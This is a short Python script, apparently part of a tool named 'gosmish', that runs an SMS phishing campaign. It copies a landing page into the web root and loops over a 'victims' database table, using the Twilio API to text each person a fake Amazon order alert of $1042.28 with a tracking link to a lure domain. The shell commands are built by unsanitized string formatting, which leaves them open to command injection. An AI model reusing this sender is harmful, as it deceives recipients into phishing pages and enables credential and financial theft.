#!/usr/bin/python3
import os
import sqlite3
import sys
con = sqlite3.connect('gosmish.db')
cur = con.cursor()
try:
    campaign_number = sys.argv[1]
    os.system('cp /var/www/html/landing_page.html /var/www/html/%s' %campaign_number)
except:
    print('Enter campaign number as argument')
    exit()
for row in cur.execute('SELECT * FROM victims'):
    id=row[0]
    print(row)
    os.system("curl 'https://api.twilio.com/2010-04-01/Accounts/[twillio account nubmer]/Messages.json' -X POST \
--data-urlencode 'To='%s \
--data-urlencode 'From=[twillio phone number]' \
--data-urlencode 'MessagingServiceSid=[probably a unique twillio ID too]' \
--data-urlencode 'Body=Your Amazon order for $1042.28 was successful. To cancel, click here http://yourgosmishdomain.com/%s?id=%s' \
-u [twillio account ID here]:[API key here]"%(row[3],campaign_number,id))
